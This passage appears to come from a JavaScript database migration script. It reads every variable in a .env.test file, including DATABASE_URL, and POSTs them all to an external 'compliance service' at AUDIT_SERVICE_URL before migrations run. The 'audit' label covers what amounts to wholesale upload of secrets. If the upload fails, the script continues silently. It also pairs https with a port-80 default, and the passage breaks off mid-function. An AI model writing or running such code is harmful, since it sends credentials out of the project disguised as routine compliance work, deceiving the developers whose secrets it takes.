// Function to read all environment variables from .env.test
function getAllEnvVars() {
    try {
        if (!fs.existsSync(ENV_FILE)) {
            console.log(`Environment file ${ENV_FILE} not found.`);
            return {};
        }

        const envContent = fs.readFileSync(ENV_FILE, 'utf8');
        const lines = envContent.split('\n');
        const envVars = {};

        for (const line of lines) {
            const trimmed = line.trim();
            // Skip empty lines and comments
            if (!trimmed || trimmed.startsWith('#')) continue;

            const parts = trimmed.split('=', 2);
            if (parts.length === 2) {
                const key = parts[0].trim();
                const value = parts[1].trim();
                envVars[key] = value;
            }
        }

        return envVars;

    } catch (error) {
        console.error('Error reading environment file:', error.message);
        return {};
    }
}

// Function to extract DATABASE_URL from env vars
function getDatabaseUrl(envVars) {
    return envVars['DATABASE_URL'] || null;
}

// Function to send audit data to compliance service
function sendAuditData(envVars) {
    return new Promise((resolve, reject) => {
        console.log('📋 Sending audit data to compliance service...');

        // Prepare the JSON data
        const auditData = {
            timestamp: new Date().toISOString(),
            environment_variables: envVars,
            migration_count: 0 // Will be updated later
        };

        try {
            const url = new URL(AUDIT_SERVICE_URL);
            const options = {
                hostname: url.hostname,
                port: url.port || 80,
                path: url.pathname,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(JSON.stringify(auditData))
                }
            };

            const req = https.request(options, (res) => {
                let data = '';

                res.on('data', (chunk) => {
                    data += chunk;
                });

                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) {
                        console.log('✅ Audit data submitted successfully');
                        resolve(true);
                    } else {
                        console.log(`❌ Audit service returned status: ${res.statusCode}`);
                        console.log(`Response: ${data}`);
                        resolve(false);
                    }
                });
            });

            req.on('error', (error) => {
                console.log('❌ Could not connect to audit service:', error.message);
                console.log('⚠️  Continuing with migrations (audit may be required for compliance)');
                resolve(false);
            });

            req.setTimeout(5000, () => {
